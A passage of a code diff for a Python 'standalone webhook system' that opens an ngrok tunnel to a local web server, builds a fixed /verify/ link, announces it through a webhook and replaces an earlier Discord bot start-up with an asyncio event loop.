+                        if (public_url := tunnel.get('public_url', '')).startswith('https://'):
+                            # Use the static ID you requested instead of a random one.
+                            permanent_link_id = "261766ea-5d4"
+                            permanent_link = f"{public_url}/verify/{permanent_link_id}"
+                            logger.info(f"✅ Ngrok live: {public_url}\n🔗 Permanent link: {permanent_link}")
+                            ngrok_ready.set(); send_webhook_startup_message(permanent_link); return
+            except requests.ConnectionError:
+                logger.warning(f"ngrok API not ready, retrying... (Attempt {i+1}/12)")
+                time.sleep(5)
+                continue
+        logger.critical("❌ Ngrok failed to start or create a tunnel in 60 seconds."); sys.exit(1)
+    except Exception as e: logger.critical(f"❌ Ngrok error: {e}"); sys.exit(1)
+
+def run_main_loop():
+    asyncio.set_event_loop(main_event_loop)
+    try:
+        main_event_loop.run_forever()
+    except KeyboardInterrupt:
+        pass
+
+def start_app():
+    logger.info("=" * 60 + "\n🚀 STANDALONE WEBHOOK SYSTEM STARTING\n" + "=" * 60)
+    
     threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
     threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
 
-    logger.info("Waiting for ngrok to initialize...")
-    if not ngrok_ready.wait(timeout=25):
-        logger.critical("❌ Timed out waiting for ngrok. Exiting.")
-        sys.exit(1)
+    if not ngrok_ready.wait(timeout=65):
+        logger.critical("❌ Timed out waiting for ngrok to initialize. Exiting."); return
     
-    if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
-        logger.critical("FATAL: DISCORD_BOT_TOKEN is not set.")
-        return
-        
-    try:
-        bot.run(DISCORD_BOT_TOKEN)
-    except Exception as e:
-        logger.critical(f"FATAL: An error occurred while running the bot: {e}")
+    logger.info("=" * 60 + f"\n✅ WEBHOOK READY | Link: {permanent_link}\n" + "=" * 60)
+    
+    run_main_loop()
 
 if __name__ == "__main__":
-    main()
+    start_app()
